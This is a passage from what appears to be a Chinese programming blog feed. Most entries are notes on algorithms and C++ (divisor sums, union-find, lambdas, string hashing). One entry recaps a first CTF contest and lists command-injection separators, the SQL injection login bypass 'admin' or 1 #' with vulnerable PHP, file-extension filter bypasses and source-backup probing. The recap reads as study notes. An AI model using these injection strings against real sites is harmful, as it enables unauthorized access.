class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod =<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;map;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;x;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=x/i;i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(x%i==<span class="hljs-number">0</span>)<br>            &#123;<br>                x/=i;<br>                ++map[i];<span class="hljs-comment">//记录每个质因数的指数</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">1</span>) ++map[x];<br>    &#125;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;m:map)<br>    &#123;<br>        ans = ans*(m.second+<span class="hljs-number">1</span>)%mod;<span class="hljs-comment">//相乘。</span><br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="求约数之和"><a href="#求约数之和" class="headerlink" title="求约数之和"></a>求约数之和</h3><p>约数和定理：<br>对于一个大于1正整数n可以分解质因数：n&#x3D;p1^a1<em>p2^a2</em>p3^a3<em>…</em>pk^ak,<br>那么n的(a₁+1)(a₂+1)(a₃+1)…(ak+1)个正约数的和为<br>f(n)&#x3D;(p1^0+p1^1+p1^2+…p1^a1)(p2^0+p2^1+p2^2+…p2^a2)…(pk^0+pk^1+pk^2+…pk^ak）。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod =<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;map;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;x;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=x/i;i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(x%i==<span class="hljs-number">0</span>)<br>            &#123;<br>                x/=i;<br>                ++map[i];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">1</span>) ++map[x];<br>    &#125;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;m:map)<br>    &#123;<br>        <span class="hljs-type">int</span> p = m.first;<br>        <span class="hljs-type">int</span> a = m.second;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> t =<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(a--) t= (t*p+<span class="hljs-number">1</span>)%mod;<span class="hljs-comment">//秦九韶算法，计算 p0+.....+pk。</span><br>        ans = (ans*t)%mod;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h3><p>扩展欧几里的算法<br>gcd(a,b)&#x3D;gcd(b,a%b)<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> b? <span class="hljs-built_in">gcd</span>(b,a%b):a;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>map和unordered_map</title>
    <link href="/2022/12/30/map%E5%92%8Cunordered_map/"/>
    <url>/2022/12/30/map%E5%92%8Cunordered_map/</url>
    
    <content type="html"><![CDATA[<p>map:map内部实现是红黑树，红黑树是非严格平衡二叉搜索树，而AVL是严格的平衡二叉搜索树，红黑树有自动排序的功能，因此map内部的元素都是有序的，操作时间复杂度为O（logn）。<br>unordered_map:内部是哈希表，在没有冲突的情况下访问速度为O（1）。<br>但在最坏的情况下可达到O（n）效率不稳定，而且不有序。<br>例题：<br><a href="https://codeforces.com/problemset/problem/1676/F">https://codeforces.com/problemset/problem/1676/F</a><br>使用unordered_map会超时，而使用map不会。</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>decltype函数</title>
    <link href="/2022/12/30/decltype/"/>
    <url>/2022/12/30/decltype/</url>
    
    <content type="html"><![CDATA[<p>decltype可以作用于变量、表达式及函数名。①作用于变量直接得到变量的类型；②作用于表达式，结果是左值的表达式得到类型的引用，结果是右值的表达式得到类型；③作用于函数名会得到函数类型，不会自动转换成指针。</p><p>decltype不会去真的求解表达式的值。<br>————————————————<br>版权声明：本文为CSDN博主「Jinxk8」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/u014609638/article/details/106987131/">https://blog.csdn.net/u014609638/article/details/106987131/</a></p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++Lambda表达式</title>
    <link href="/2022/12/30/C++Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/12/30/C++Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>lambda函数的语法<br>基本形式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">[capture](parameters)-&gt;<span class="hljs-keyword">return</span>-type &#123;body&#125;<br></code></pre></td></tr></table></figure><ul><li>[]叫做捕获说明符，表示一个lambda表达式的开始。接下来是参数列表，即这个匿名的lambda函数的参数。</li><li>parameters，普通参数列表</li><li>-&gt;return-type表示返回类型，如果没有返回类型，则可以省略这部分。这涉及到c++11的另一特性，参见自动类型推导，最后就是函数体部分。<br>-[ ]        ：无捕获，函数体内不能访问任何外部变量 </li><li>[ &#x3D;]      ：以值（拷贝）的方式捕获所有外部变量，函数体内可以访问，但是不能修改。</li><li>[ &amp;]      ：以引用的方式捕获所有外部变量，函数体内可以访问并修改（需要当心无效的引用）；</li><li>[ var]   ：以值（拷贝）的方式捕获某个外部变量，函数体可以访问但不能修改。</li><li>[ &amp;var] ：以引用的方式获取某个外部变量，函数体可以访问并修改</li><li>[ this]   ：捕获this指针，可以访问类的成员变量和函数，</li><li>[ &#x3D;，&amp;var] ：引用捕获变量var，其他外部变量使用值捕获。</li><li>[ &amp;，var]：只捕获变量var，其他外部变量使用引用捕获。</li></ul>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>引用传值</title>
    <link href="/2022/12/30/C++%E5%BC%95%E7%94%A8%E4%BC%A0%E5%80%BC/"/>
    <url>/2022/12/30/C++%E5%BC%95%E7%94%A8%E4%BC%A0%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>同样的cmp函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-keyword">auto</span> cmp = [&amp;](<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  b) &#123;<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>] ? (a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>]) : (a[<span class="hljs-number">0</span>] &gt; b[<span class="hljs-number">0</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用值传递会直接超时</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-keyword">auto</span> cmp = [&amp;](<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  &amp;a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  &amp;b) &#123;<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>] ? (a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>]) : (a[<span class="hljs-number">0</span>] &gt; b[<span class="hljs-number">0</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用引用传值时则不会</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查分算法</title>
    <link href="/2022/12/30/%E5%B7%AE%E5%88%86%E7%AE%97%E6%B3%95/"/>
    <url>/2022/12/30/%E5%B7%AE%E5%88%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><img src="/upload/2022/03/image-4fb92c4b8d2249b986fb04cdde61a4b7.png" alt="image.png"></p><h4 id="差分可以看做是求前缀和的逆向过程。"><a href="#差分可以看做是求前缀和的逆向过程。" class="headerlink" title="差分可以看做是求前缀和的逆向过程。"></a>差分可以看做是求前缀和的逆向过程。</h4><p>差分数组的定义为<br>d[i] &#x3D; a[i]-a[i-1];<br>例如现在有一个数组为<br>[1,3,5,4,2]<br>那么它的差分数组为<br>[0,2,2,-1,-2]</p><h4 id="差分数组如何做到时间复杂度为O-1-的数组区间修改的。"><a href="#差分数组如何做到时间复杂度为O-1-的数组区间修改的。" class="headerlink" title="差分数组如何做到时间复杂度为O(1)的数组区间修改的。"></a>差分数组如何做到时间复杂度为O(1)的数组区间修改的。</h4><p>例如，现在想对区间[l,r]的进行加v的操作。<br>那么只需要在差分数组进行操作：<br>d[l]&#x3D;d[l]+v;<br>d[r+1]&#x3D;d[r+1]-v;<br>这样在求回原数组的时候，d[l]增加了v，由于累加的性质，那么它后面直到下标r都增加了v。 对于d[r+1]来说，由差分数组的定义，被减数不变，减数增加了v那么它必定也要减小v，所以进行该两项进行操作。</p><h4 id="模板例题"><a href="#模板例题" class="headerlink" title="模板例题"></a>模板例题</h4><p><a href="https://leetcode-cn.com/problems/corporate-flight-bookings/">https://leetcode-cn.com/problems/corporate-flight-bookings/</a></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>并查集</title>
    <link href="/2022/12/30/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    <url>/2022/12/30/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>并查集是一种树型的数据结构，用于处理一些不相交集合（disjoint sets）的合并及查询问题。并查集通常包含两种操作，查找，合并。<br>模板代码：<br>朴素并查集+路径压缩优化:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(p[x]!=x) p[x]= <span class="hljs-built_in">find</span>(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><span class="hljs-comment">//p[x]存储每个点的祖宗节点。</span><br><span class="hljs-comment">//find(x)返回x的祖宗节点。</span><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ ) p[i] = i;<br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>    p[<span class="hljs-built_in">find</span>(a)] = <span class="hljs-built_in">find</span>(b);<br></code></pre></td></tr></table></figure><p>并查集同时还可以维护同一类别节点数量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> size[N];<span class="hljs-comment">//存储节点数量数组。size[i]表示第i个集合的节点数量。</span><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>    &#123;<br>        p[i] = i;<br>        size[i] = <span class="hljs-number">1</span>;<br>    &#125;<br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>size[<span class="hljs-built_in">find</span>(b)] += size[<span class="hljs-built_in">find</span>(a)];<br>p[<span class="hljs-built_in">find</span>(a)] = <span class="hljs-built_in">find</span>(b);<br></code></pre></td></tr></table></figure><p>也可以同时维护到祖宗节点的距离。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> p[N], d[N];<span class="hljs-comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离</span><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (p[x] != x)<br>  &#123;<br>     <span class="hljs-type">int</span> u = <span class="hljs-built_in">find</span>(p[x]);<br>     d[x] += d[p[x]];<br>     p[x] = u;<br>   &#125;<br>   <span class="hljs-keyword">return</span> p[x];<br>&#125;<br>   <span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>    p[<span class="hljs-built_in">find</span>(a)] = <span class="hljs-built_in">find</span>(b);<br>    d[<span class="hljs-built_in">find</span>(a)] = distance; <span class="hljs-comment">// 根据具体问题，初始化find(a)的偏移量</span><br><br></code></pre></td></tr></table></figure><p>例题：<a href="https://www.acwing.com/problem/content/242/">https://www.acwing.com/problem/content/242/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">50005</span>;<br><span class="hljs-type">int</span> p[N];<br><span class="hljs-type">int</span> d[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(p[x]!=x) <br>    &#123;<br>        <span class="hljs-type">int</span> t = <span class="hljs-built_in">find</span>(p[x]);<br>        d[x]+=d[p[x]];<br>        p[x]=t;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) p[i] = i;<br>    <span class="hljs-type">int</span> t,x,y;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(k--)<br>    &#123;<br>        cin&gt;&gt;t&gt;&gt;x&gt;&gt;y;<br>        <span class="hljs-keyword">if</span>(x&gt;n || y&gt;n)++ans;<br>        <span class="hljs-keyword">else</span><span class="hljs-comment">//不冲突即为真话。</span><br>        &#123;<br>            <span class="hljs-type">int</span> px= <span class="hljs-built_in">find</span>(x);<br>            <span class="hljs-type">int</span> py =<span class="hljs-built_in">find</span>(y);<br>            <span class="hljs-keyword">if</span>(t==<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(px==py &amp;&amp; (d[x]-d[y])%<span class="hljs-number">3</span>!=<span class="hljs-number">0</span>)<span class="hljs-comment">//已经在一个集合里面， t==1 (d[x]%3 != d[y]%3) 不为0 即，x,y不为同类。</span><br>                &#123;<br>                    ++ans;<span class="hljs-comment">//假话增加。</span><br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(px!=py)<span class="hljs-comment">//x,y不属于同一个集合。 将x,y更新到同一个集合当中。</span><br>                &#123;<br>                    p[px] = py;<br>                    d[px] = d[y]-d[x];<span class="hljs-comment">//距离更新，满足(d[x]+d[px]-d[y])%3==0,更新为同类。</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">if</span>(px==py &amp;&amp; (d[x]-d[y]<span class="hljs-number">-1</span>)%<span class="hljs-number">3</span>!=<span class="hljs-number">0</span>) ans++;<span class="hljs-comment">//x,y在同一个集合当中。若x吃y，则 (d[x]-d[y]-1)%3==0,反之为假话。</span><br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(px!=py) <span class="hljs-comment">//x,y不属于同一集合，将x,y更新到同一个集合当中。</span><br>                &#123;<br>                    p[px] = py;<br>                    d[px] = d[y]+<span class="hljs-number">1</span>-d[x];<span class="hljs-comment">//距离更新，满足(d[x]-d[y]-1+d[px])%3==0 使得x吃y。</span><br>                    <br>                &#125;<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第一次CTF比赛总结</title>
    <link href="/2022/12/30/%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/30/%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>第一次参加CTF比赛，虽然只是个校赛qaq.<br>但还是根据题解学到了很多东西。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>1.png常用隐写 LSB隐写，大概就是像素改变一位，人看不出来具体的变化。<br>2.流量分析，<br>1.对于后台的登录一定是有一个302进行跳转，渗透时分析 post流量。然后word隐写，word自带隐藏隐藏文字功能。或者直接改word后缀，使得改为压缩包，直接分析dom文档，得到隐藏内容。<br>3.音频隐写，mp3stego，steghide等软件进提取。<br>4.内存取证，一般给vmem文件，通过Volatility取证工具进行分析，对可疑文件进行dump。然后后面看不太懂，学到NTLM加密为windows密码加密。<br>5.学习知识点，foremost 直接进行分离，binwalk -e 提取找到的任何形式的文件。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>1.ssti模板注入。<br>SSTI （Server-Side Template Injection）服务器端模板注入<br>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。<br>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。剩下的暂时不太懂qaq。后续完善<br>2.常用命令分隔符。<br>远程代码执行和bypass</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haml">; 执行完当前指令后执行下一条指令<br>|  管道符<br>&amp;&amp; 左侧命令执行成功后，执行右侧命令<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> url换行符<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> url回车符<br></code></pre></td></tr></table></figure><p>3.sql 注入<br>admin’ or 1 #</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;conn);<br></code></pre></td></tr></table></figure><p>实际上的代码就变成了select * from users where username&#x3D;’admin’ or 1#’ and password&#x3D;’$password’ 。由于#后的代码被注释了，实际上执行的查询语句就是select * from users where username&#x3D;’admin’ or 1。条件恒真，以管理员账号登录后台。<br>扩展名不允许可以改包或者 改后缀名或者一起改绕过，如php,Php,phP等，还可以改包时改后缀名。<br>4.访问 &#x2F;<a href="http://www.zip/">www.zip</a> 可以下载网站源码备份，这是网站常见源码备份名<br>Crypto:<br>1.维吉尼亚密码加密<br>2.个算法只需要前624个随机数，就可以恢复前624个state，就可以预测此后生成的随机数。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>最小生成树的算法</title>
    <link href="/2022/12/30/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91mst/"/>
    <url>/2022/12/30/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91mst/</url>
    
    <content type="html"><![CDATA[<h3 id="prim算法"><a href="#prim算法" class="headerlink" title="prim算法"></a>prim算法</h3><p>从已知的某个定点向外扩散，寻找最小的邻边，将顶点加入集合，如果顶点已经加入，则跳过（防止成环），直到所有顶点都加入到集合中，构成mst。<br>适合稠密图</p><h3 id="kruskal算法"><a href="#kruskal算法" class="headerlink" title="kruskal算法"></a>kruskal算法</h3><p>从整个图的最小的一条边开始贪心，在不成环的情况下，不断和并最后构成最小生成树。<br>适合稀疏图。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字符串哈希</title>
    <link href="/2022/12/30/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%93%88%E5%B8%8C/"/>
    <url>/2022/12/30/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%93%88%E5%B8%8C/</url>
    
    <content type="html"><![CDATA[<p>字符串哈希，将字符串映射成为哈希值，从而达到快速比较求得子串的功能。<br>模板，注意(字符串从1开始存储)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br>ULL h[N], p[N]; <span class="hljs-comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span><br><span class="hljs-comment">// 初始化</span><br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i];<br>    p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>&#125;<br><br><span class="hljs-comment">// 计算子串 str[l ~ r] 的哈希值</span><br><span class="hljs-function">ULL <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span 